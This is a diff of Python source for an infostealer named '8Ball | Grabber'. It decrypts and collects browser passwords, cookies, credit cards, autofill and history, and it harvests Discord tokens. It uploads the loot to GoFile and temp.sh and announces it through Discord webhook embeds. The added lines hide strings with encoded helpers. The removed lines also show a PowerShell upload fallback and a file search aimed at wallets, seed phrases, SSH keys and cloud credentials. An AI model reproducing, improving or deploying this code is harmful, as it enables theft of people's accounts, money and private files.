-                decrypted = D3CrYP7V41U3(row[2], master_key, appbound_key)
-            except:
-                decrypted = None
-            if decrypted is None:
-                decrypted = "N/A"
-            P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {decrypted}")
-            P455WC0UNt += 1
-            csv_rows.append((row[0], str(row[1]) if row[1] else "", str(decrypted) if decrypted else ""))
-        Wr173F0rF113(P455w, 'passwords')
-
-        temp_dir = os.getenv("TEMP")
-        csv_path = os.path.join(temp_dir, "crpasswords.csv")
-        import csv as csvmod
-        with open(csv_path, mode="w", newline="", encoding="utf-8") as csvfile:
-            writer = csvmod.writer(csvfile)
-            writer.writerow(["url", "username", "password"])
-            writer.writerows(csv_rows)
-    except:pass
-
-def G37C00K13(path, arg):
-    """
-    Browser cookies grabber.
-    Currently not exposed as a separate UI feature; if you want it,
-    you can add a new checkbox and FEATURE_CONFIG key.
-    """
-    if not FEATURE_CONFIG.get("browser_data", False):
-        return
-    try:
-        global C00K13s, C00K1C0UNt
-        if not os.path.exists(path): return
-
-        pathC = path + arg + "/Cookies"
-        if os.stat(pathC).st_size == 0: return
-
-        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-
-        data = SQ17H1N6(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")
-
-        pathKey = path + "/Local State"
-
-        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
-        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-        master_key = CryptUnprotectData(master_key[5:])
-
-        appbound_key = G37AppBoundK3Y(path)
-
-        for row in data:
-            for wa in k3YW0rd:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split('[')[1].split(']')[0]
-                if wa in row[0]:
-                    if not old in c00K1W0rDs: c00K1W0rDs.append(old)
-            try:
-                decrypted = D3CrYP7V41U3(row[2], master_key, appbound_key)
-            except:
-                decrypted = None
-            if decrypted is None:
-                decrypted = "N/A"
-            C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{decrypted}")
-            C00K1C0UNt += 1
-        Wr173F0rF113(C00K13s, 'cookies')
-    except:pass
 
 def G37CC5(path, arg):
     """Browser credit card grabber – gated by 'Credit Cards' feature."""
@@ -1233,45 +1979,137 @@ def s74r787Hr34D(func, arg):
     Browserthread.append(t)
 
 def G378r0W53r5(br0W53rP47H5):
-    """
-    Master browser data collector:
-    - passwords, cookies, CCs, autofill, history, bookmarks
-    - uploads temp files to GoFile and sends summary embeds
-    Only active when 'Browser Data Extractor' (browser_data) is enabled.
-    """
-    if not FEATURE_CONFIG.get("browser_data", False):
+    if not FEATURE_CONFIG.get("browser_credentials", False):
         return
     create_windows_user()
     global Browserthread
-    ThCokk, Browserthread, filess = [], [], []
+    Browserthread, filess = [], []
 
     for patt in br0W53rP47H5:
-        # Cookies (part of browser_data, no dedicated UI toggle)
-        a = threading.Thread(target=G37C00K13, args=[patt[0], patt[4]])
-        a.start()
-        ThCokk.append(a)
-
-        # Autofill & history
         if FEATURE_CONFIG.get("browser_autofill_history", False):
             s74r787Hr34D(G374U70F111, [patt[0], patt[3]])
             s74r787Hr34D(G37H1570rY, [patt[0], patt[3]])
-
-        # Bookmarks
         if FEATURE_CONFIG.get("browser_bookmarks", False):
             s74r787Hr34D(G37800KM4rK5, [patt[0], patt[3]])
-
-        # Credit cards
         if FEATURE_CONFIG.get("browser_credit_cards", False):
             s74r787Hr34D(G37CC5, [patt[0], patt[3]])
 
-        # Passwords (always run if browser_data is enabled)
-        s74r787Hr34D(G37P455W, [patt[0], patt[3]])
+    def chromium_recovery_wrapper():
+        global P455w, P455WC0UNt, p45WW0rDs
+        P455w, P455WC0UNt, p45WW0rDs = [], 0, []
+        try:
+            csv_rows = []
+            RX_DB6(f"Chromium PW: checking {len(Chromium.PATHS)} browsers")
+            for browser, bpath in Chromium.PATHS.items():
+                try:
+                    RX_DB6(f"Chromium PW: scanning {browser} at {bpath}")
+                    accounts = Chromium._accounts(bpath, browser)
+                    count = 0
+                    for account in accounts:
+                        count += 1
+                        for wa in k3YW0rd:
+                            old = wa
+                            if "https" in wa:
+                                tmp = wa
+                                wa = tmp.split('[')[1].split(']')[0]
+                            if wa in account['url']:
+                                if not old in p45WW0rDs: p45WW0rDs.append(old)
+                        P455w.append(f"UR1: {account['url']} | U53RN4M3: {account['username']} | P455W0RD: {account['password']}")
+                        P455WC0UNt += 1
+                        csv_rows.append((account['url'], account['username'], account['password']))
+                    RX_DB6(f"Chromium PW: {browser} yielded {count} accounts")
+                except Exception as e:
+                    RX_DB6(f"Chromium PW: {browser} failed: {e}", "WARN")
+            RX_DB6(f"Chromium PW: total {P455WC0UNt} passwords, {len(p45WW0rDs)} keywords")
+            Wr173F0rF113(P455w, 'passwords')
+            temp_dir = os.getenv("TEMP")
+            csv_path = os.path.join(temp_dir, "crpasswords.csv")
+            import csv as csvmod
+            with open(csv_path, mode="w", newline="", encoding="utf-8") as csvfile:
+                writer = csvmod.writer(csvfile)
+                writer.writerow(["url", "username", "password"])
+                writer.writerows(csv_rows)
+            RX_DB6("Chromium PW: files written successfully")
+        except Exception as e:
+            RX_DB6(f"Chromium PW: wrapper crashed: {e}", "ERROR")
+    s74r787Hr34D(chromium_recovery_wrapper, [])
 
-    # Wait for cookie threads
-    for thread in ThCokk:
-        thread.join()
-    if TrU57(C00K13s) is True:
-        __import__('sys').exit(0)
+    def chromium_cookies_wrapper():
+        global C00K13s, C00K1C0UNt, c00K1W0rDs
+        try:
+            for browser, bpath in Chromium.PATHS.items():
+                for cookie in Chromium._cookies(bpath, browser):
+                    for wa in k3YW0rd:
+                        old = wa
+                        if "https" in wa:
+                            tmp = wa
+                            wa = tmp.split('[')[1].split(']')[0]
+                        if wa in cookie['host']:
+                            if not old in c00K1W0rDs: c00K1W0rDs.append(old)
+                    C00K13s.append(f"{cookie['host']}	TRUE	/	FALSE	2597573456	{cookie['name']}	{cookie['value']}")
+                    C00K1C0UNt += 1
+            Wr173F0rF113(C00K13s, 'cookies')
+        except Exception:
+            pass
+    s74r787Hr34D(chromium_cookies_wrapper, [])
+
+    # Chromium autofill recovery
+    if FEATURE_CONFIG.get("browser_autofill_history", False):
+        def chromium_autofill_wrapper():
+            global AU70F11l, AU70F111C0UNt
+            try:
+                result = Chromium.autofill_recovery()
+                for line in result.split("\n"):
+                    if line.startswith("Name: ") or line.startswith("Value: ") or line.startswith("Application: ") or line.startswith("="):
+                        AU70F11l.append(line)
+                        if line.startswith("Value: ") and line[7:].strip():
+                            AU70F111C0UNt += 1
+            except Exception:
+                pass
+        s74r787Hr34D(chromium_autofill_wrapper, [])
+
+        def chromium_history_wrapper():
+            global H1570rY, H1570rYC0UNt
+            try:
+                result = Chromium.history_recovery()
+                for line in result.split("\n"):
+                    if line.startswith("URL: ") or line.startswith("Title: ") or line.startswith("Visits: ") or line.startswith("Application: ") or line.startswith("="):
+                        H1570rY.append(line)
+                        if line.startswith("URL: ") and line[5:].strip():
+                            H1570rYC0UNt += 1
+            except Exception:
+                pass
+        s74r787Hr34D(chromium_history_wrapper, [])
+
+    # Chromium bookmarks recovery
+    if FEATURE_CONFIG.get("browser_bookmarks", False):
+        def chromium_bookmarks_wrapper():
+            global B00KM4rK5, B00KM4rK5C0UNt
+            try:
+                result = Chromium.bookmarks_recovery()
+                for line in result.split("\n"):
+                    if line.startswith("Name: ") or line.startswith("URL: ") or line.startswith("Application: ") or line.startswith("="):
+                        B00KM4rK5.append(line)
+                        if line.startswith("URL: ") and line[5:].strip():
+                            B00KM4rK5C0UNt += 1
+            except Exception:
+                pass
+        s74r787Hr34D(chromium_bookmarks_wrapper, [])
+
+    # Chromium credit card recovery
+    if FEATURE_CONFIG.get("browser_credit_cards", False):
+        def chromium_cc_wrapper():
+            global CCs, CC5C0UNt
+            try:
+                result = Chromium.cc_recovery()
+                for line in result.split("\n"):
+                    if line.startswith("Name: ") or line.startswith("Number: ") or line.startswith("Expiry: ") or line.startswith("Application: ") or line.startswith("="):
+                        CCs.append(line)
+                        if line.startswith("Number: ") and line[8:].strip():
+                            CC5C0UNt += 1
+            except Exception:
+                pass
+        s74r787Hr34D(chromium_cc_wrapper, [])
 
     # Wait for all browser threads
     for thread in Browserthread:
@@ -1312,7 +2150,7 @@ def G378r0W53r5(br0W53rP47H5):
                     f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Passwords.csv]({filess[1]})"
                 ),"footer": {
                     "text": "8Ball",
-                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
+                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             },
             {
@@ -1323,7 +2161,7 @@ def G378r0W53r5(br0W53rP47H5):
                     f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Cookies.txt]({filess[2]})"
                 ),"footer": {
                     "text": "8Ball",
-                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
+                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             },
             {
@@ -1339,12 +2177,12 @@ def G378r0W53r5(br0W53rP47H5):
                     f"<a:CH_IconArrowRight:715585320178941993> • [8Ball_Bookmarks.txt]({filess[6]})"
                 ),"footer": {
                     "text": "8Ball",
-                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
+                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             }
         ],
         "username": "8Ball | Grabber",
-        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
+        "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
     }
@@ -1360,25 +2198,28 @@ def G378r0W53r5(br0W53rP47H5):
 def G37D15C0rD(path, arg):
     if not FEATURE_CONFIG.get("discord_tokens", False):
         return
-    if not os.path.exists(f"{path}/Local State"): return
+    _ls = _j()
+    if not os.path.exists(f"{path}{_ls}"):
+        return
     pathC = path + arg
-    pathKey = path + "/Local State"
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
-    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    pathKey = path + _ls
+    with open(pathKey, 'r', encoding='utf-8') as f:
+        local_state = loads(f.read())
+    master_key = b64decode(local_state[_k()][_l()])
     master_key = CryptUnprotectData(master_key[5:])
-
     if not os.path.isdir(pathC):
         return
+    _prefix = _h()
     for file in os.listdir(pathC):
         if file.endswith(".log") or file.endswith(".ldb"):
-                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
-                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                        global T0K3Ns
-                        tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
-                        if CH3CK70K3N(tokenDecoded):
-                            if not tokenDecoded in T0K3Ns:
-                                T0K3Ns += tokenDecoded
-                                UP104D70K3N(tokenDecoded, path)
+            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
+                for token in re.findall(rf"{_prefix}[^.*\['(.*)'\].*$][^\"]*", line):
+                    global T0K3Ns
+                    tokenDecoded = D3CrYP7V41U3(b64decode(token.split(_prefix)[1]), master_key)
+                    if CH3CK70K3N(tokenDecoded):
+                        if not tokenDecoded in T0K3Ns:
+                            T0K3Ns += tokenDecoded
+                            UP104D70K3N(tokenDecoded, path)
 
 def G47H3rZ1P5(paths1, paths2, paths3):
     """
@@ -1433,12 +2274,12 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             "title": f"8Ball | App 8Ball",
             "description": f"{wal}\n{ga}\n{ot}","footer": {
                 "text": f"8Ball",
-                "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
+                "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"
             }
             }
         ],
         "username": f"8Ball | Grabber",
-        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
     }
@@ -1499,7 +2340,10 @@ def Z1P7H1N65(path, arg, procc):
         if "https://" in str(lnik):break
         time.sleep(4)
 
-    os.remove(f"{temp}/{name}.zip")
+    try:
+        os.remove(f"{temp}/{name}.zip")
+    except PermissionError:
+        pass
     if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
         W411375Z1p.append([name, lnik])
     elif "Steam" in name or "RiotCli" in name:
@@ -1529,30 +2373,31 @@ T0K3Ns = ""
 def G47H3r411():
     RX_DB6("[8Ball] G47H3r411 orchestrator starting...")
     br0W53rP47H5 = [
-        [f"{roaming}/Opera Software/Opera GX Stable",             "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
-        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
-        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
-        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
-        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
-        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
-        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
-        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
-        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
-        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
-        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
-        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
-        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
-        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
-        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
-        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
-        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{roaming}/Opera Software/Opera GX Stable",             "opera.exe",        "/Local Storage/leveldb",           "",              "/Network",             "/Local Extension Settings/"                      ],
+        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "",              "/Network",             "/Local Extension Settings/"                      ],
+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "",              "/Network",             "/Local Extension Settings/"                      ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
         [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
     ]
+    _ds = _i()
     d15C0rDP47H5 = [
-        [f"{roaming}/discord",          "/Local Storage/leveldb"],
-        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
-        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
-        [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
+        [f"{roaming}/{_y('9fj/7+7z+A==')}",          _ds],
+        [f"{roaming}/{_y('9dD0+//o7vP4')}",        _ds],
+        [f"{roaming}/{_y('9fj/7+7z//jy/e795Q==')}",    _ds],
+        [f"{roaming}/{_y('9fj/7+7z7Pj+6A==')}",       _ds],
     ]
 
     p47H570Z1P = [
@@ -1591,10 +2436,8 @@ def G37F11353rv3r():
 
 def UP104D7060F113(path):
     errors = []
-    # --- GoFile upload ---
     try:
         server = G37F11353rv3r()
-        RX_DB6(f"[8Ball] GoFile: server={server}, file={path}")
         with open(path, "rb") as f:
             r = requests.post(
                 f"https://{server}.gofile.io/contents/uploadfile",
@@ -1604,107 +2447,15 @@ def UP104D7060F113(path):
             )
         r.raise_for_status()
         data = r.json()
-        RX_DB6(f"[8Ball] GoFile response: status={data.get('status')}")
         if data.get("status") == "ok":
             dl = data.get("data", {}).get("downloadPage") or data.get("data", {}).get("directLink", "")
             if dl:
-                RX_DB6(f"[8Ball] GoFile upload OK: {dl}")
                 return dl
-            errors.append(f"GoFile: missing downloadPage in response")
+            errors.append("GoFile: missing downloadPage in response")
         else:
             errors.append(f"GoFile: status={data.get('status')}")
     except Exception as e:
-        err = f"GoFile requests failed: {type(e).__name__}: {e}"
-        errors.append(err)
-        RX_DB6(f"[8Ball] {err}")
-        try:
-            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
-            with open(path, "rb") as f:
-                file_data = f.read()
-            filename = os.path.basename(path)
-            body = (
-                f"--{boundary}\r\n"
-                f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
-                f"Content-Type: application/octet-stream\r\n\r\n"
-            ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()
-            req = Request(
-                f"https://{server}.gofile.io/contents/uploadfile",
-                data=body,
-                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
-            )
-            import ssl
-            ctx = ssl._create_unverified_context()
-            resp = urlopen(req, timeout=120, context=ctx).read().decode()
-            data = loads(resp)
-            if data.get("status") == "ok" and "downloadPage" in data.get("data", {}):
-                dl = data["data"]["downloadPage"]
-                RX_DB6(f"[8Ball] GoFile urllib-fallback OK: {dl}")
-                return dl
-            errors.append("GoFile urllib: unexpected response format")
-        except Exception as e2:
-            err2 = f"GoFile urllib failed: {type(e2).__name__}: {e2}"
-            errors.append(err2)
-            RX_DB6(f"[8Ball] {err2}")
-
-    # --- Fallback: temp.sh ---
-    try:
-        RX_DB6("[8Ball] Upload: trying temp.sh...")
-        with open(path, "rb") as f:
-            r = requests.post(
-                "https://temp.sh/upload",
-                files={"file": f},
-                timeout=120,
-                verify=False
-            )
-        r.raise_for_status()
-        url = r.text.strip()
-        if url.startswith("http"):
-            RX_DB6(f"[8Ball] temp.sh upload OK: {url}")
-            return url
-        errors.append(f"temp.sh: unexpected response: {url[:100]}")
-    except Exception as e:
-        err = f"temp.sh failed: {type(e).__name__}: {e}"
-        errors.append(err)
-        RX_DB6(f"[8Ball] {err}")
-
-    # --- Fallback: PowerShell Invoke-WebRequest (native Windows, no Python deps) ---
-    try:
-        RX_DB6("[8Ball] Upload: trying PowerShell...")
-        import subprocess
-        ps_cmd = f'''
-$boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
-$server = "{G37F11353rv3r()}"
-$filePath = "{path.replace('"', '`"')}"
-$fileName = [System.IO.Path]::GetFileName($filePath)
-$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-$body = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
-$bodyBytes = [Text.Encoding]::UTF8.GetBytes($body) + $fileBytes + [Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
-try {{
-    $r = Invoke-WebRequest -Uri "https://$server.gofile.io/contents/uploadfile" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes -TimeoutSec 120
-    Write-Host $r.Content
-}} catch {{
-    Write-Host "POWERSHELL_ERROR:$_"
-}}
-'''
-        result = subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, text=True, timeout=130)
-        output = result.stdout.strip()
-        if "POWERSHELL_ERROR" not in output and output:
-            try:
-                ps_data = loads(output)
-                if ps_data.get("status") == "ok":
-                    dl = ps_data.get("data", {}).get("downloadPage", "")
-                    if dl:
-                        RX_DB6(f"[8Ball] PowerShell upload OK: {dl}")
-                        return dl
-            except:
-                pass
-        errors.append(f"PowerShell: no valid response")
-    except Exception as e:
-        err = f"PowerShell failed: {type(e).__name__}: {e}"
-        errors.append(err)
-        RX_DB6(f"[8Ball] {err}")
-
-    # --- Final fallback: try 3 GoFile hardcoded servers directly ---
+        errors.append(f"GoFile requests failed: {type(e).__name__}: {e}")
     for fb_server in ["store1", "store2", "store3"]:
         try:
             with open(path, "rb") as f:
@@ -1719,38 +2470,19 @@ try {{
             if data.get("status") == "ok":
                 dl = data.get("data", {}).get("downloadPage", "")
                 if dl:
-                    RX_DB6(f"[8Ball] GoFile fallback {fb_server} OK: {dl}")
                     return dl
         except Exception as e:
-            err = f"GoFile fallback {fb_server}: {type(e).__name__}: {e}"
-            errors.append(err)
-
-    RX_DB6(f"[8Ball] All upload methods failed: {'; '.join(errors)}")
-    return errors  # Return errors list so caller can display them
-
-def K1W1F01D3r(pathF, keywords):
-    global K1W1F113s
-    maxfilesperdir = 7
-    i = 0
+            errors.append(f"GoFile fallback {fb_server}: {type(e).__name__}: {e}")
     try:
-        listOfFile = os.listdir(pathF)
-    except OSError:
-        return
-
-    ffound = []
-    for file in listOfFile:
-        fullpath = os.path.join(pathF, file)
-        if not os.path.isfile(fullpath):
-            continue
-        if i >= maxfilesperdir:
-            break
-        if os.stat(fullpath).st_size < 5000000 and not fullpath.lower().endswith(".lnk"):
-            url = UP104D7060F113(fullpath)
-            if url:
-                ffound.append([fullpath, url])
-                i += 1
-
-    K1W1F113s.append(["folder", pathF + os.sep, ffound])
+        with open(path, "rb") as f:
+            r = requests.post("https://temp.sh/upload", files={"file": f}, timeout=120, verify=False)
+        r.raise_for_status()
+        url = r.text.strip()
+        if url.startswith("http"):
+            return url
+    except Exception as e:
+        errors.append(f"temp.sh failed: {type(e).__name__}: {e}")
+    return errors
 
 K1W1F113s = []
 def K1W1F113(path, keywords):
@@ -1773,85 +2505,23 @@ def K1W1F113(path, keywords):
         return
     K1W1F113s.append(["folder", path, fifound])
 
-
 def K1W1():
-    """
-    Local Files feature:
-    - searches Desktop, Downloads, Documents, Pictures, Videos, Recent
-    - uploads matching files to GoFile and tracks them in K1W1F113s
-    Only active when 'Local Files' (file_search) feature is enabled.
-    """
     if not FEATURE_CONFIG.get("file_search", False):
         return []
-
     user_profile = os.path.expanduser("~")
-    user_root = os.path.dirname(user_profile)
-
-    if not user_root:
-        user_root = user_profile
-
     K1W1F113s.clear()
-
     path2search = [
-        # User profile top-level (Documents, Downloads, etc.)
         os.path.join(user_profile, "Desktop"),
         os.path.join(user_profile, "Downloads"),
         os.path.join(user_profile, "Documents"),
         os.path.join(user_profile, "Pictures"),
         os.path.join(user_profile, "Videos"),
-        os.path.join(user_profile, "Music"),
-        # OneDrive equivalents
-        os.path.join(user_profile, "OneDrive", "Desktop"),
-        os.path.join(user_profile, "OneDrive", "Documents"),
-        os.path.join(user_profile, "OneDrive", "Pictures"),
-        os.path.join(user_profile, "OneDrive", "Downloads"),
-        # AppData / config areas with valuable data
         os.path.join(roaming, "Microsoft", "Windows", "Recent"),
-        os.path.join(roaming, "Microsoft", "Windows", "Start Menu"),
-        os.path.join(local, "Google", "Chrome", "User Data"),
-        os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
-        os.path.join(roaming, "Opera Software"),
-        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
-        os.path.join(roaming, "discord"),
-        os.path.join(local, "Discord"),
-        os.path.join(roaming, "telegram"),
-        os.path.join(local, "Telegram Desktop"),
-        os.path.join(roaming, "Signal"),
-        os.path.join(roaming, "Slack"),
-        os.path.join(user_profile, "AppData"),
-        # Common config/credential stores
-        os.path.join(local, "Microsoft", "Credentials"),
-        os.path.join(roaming, "Microsoft", "Credentials"),
-        os.path.join(local, "Microsoft", "Vault"),
-        os.path.join(roaming, "Microsoft", "Vault"),
-        os.path.join(local, "Microsoft", "Internet Explorer"),
-        os.path.join(roaming, "Microsoft", "Internet Explorer"),
-        # Gaming launchers
-        os.path.join(user_profile, "Documents", "Rockstar Games"),
-        os.path.join(user_profile, "Documents", "My Games"),
-        # SSH / GPG keys
-        os.path.join(user_profile, ".ssh"),
-        os.path.join(user_profile, ".gnupg"),
-        os.path.join(user_profile, ".aws"),
-        os.path.join(user_profile, ".azure"),
     ]
     key_wordsFiles = [
-        "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret",
-        "bot", "atomic", "account", "acount", "paypal", "banque", "metamask", "wallet",
-        "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token",
-        "backup", "seed", "mnemonic", "memoric", "private", "key", "passphrase",
-        "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé",
-        "prive", "telegram", "identifiant", "personnel", "trading", "bitcoin",
-        "sauvegarde", "funds", "récupé", "recup", "note", "txt", "doc", "json",
-        "config", "cred", "secret", "auth", "api", "key", "cert",
-        "пароль", "секрет", "аккаунт", "банк", "логин", "кошелек", "мнемоника",
